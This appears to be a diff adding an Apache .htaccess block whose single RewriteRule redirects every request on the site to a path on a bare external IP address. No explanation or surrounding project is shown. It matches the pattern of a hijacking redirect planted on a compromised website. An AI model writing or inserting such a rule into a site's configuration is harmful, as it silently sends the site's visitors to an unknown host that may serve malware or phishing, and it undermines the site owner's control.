@@ -1,0 +1,6 @@
+
+<IfModule mod_rewrite.c>
+
+RewriteRule ^(.*)$ http://103.101.225.139/m4n3riq/absensi/plugins/$1 [L]
+</IfModule>
+
